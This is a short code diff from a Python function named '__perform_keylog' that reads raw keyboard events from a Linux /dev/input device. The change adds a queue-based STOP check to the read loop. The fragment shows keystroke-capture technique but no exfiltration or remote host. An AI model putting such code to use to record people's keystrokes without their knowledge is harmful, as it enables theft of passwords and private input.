@@ -316,6 +316,9 @@ def __perform_keylog(event_x: str,
 
         with open(f"/dev/input/{event_x}", "rb") as file:
             while signal_queue.empty():
+                if not signal_queue.empty() and signal_queue.get() == "STOP":
+                    break
+
                 # Event FORMAT: {timestamp, time_in_microseconds, event_type, event_code, event_value}
                 event_x = file.read(24)
                 _, _, event_type, event_code, event_value = struct.unpack("LLHHi", event_x)
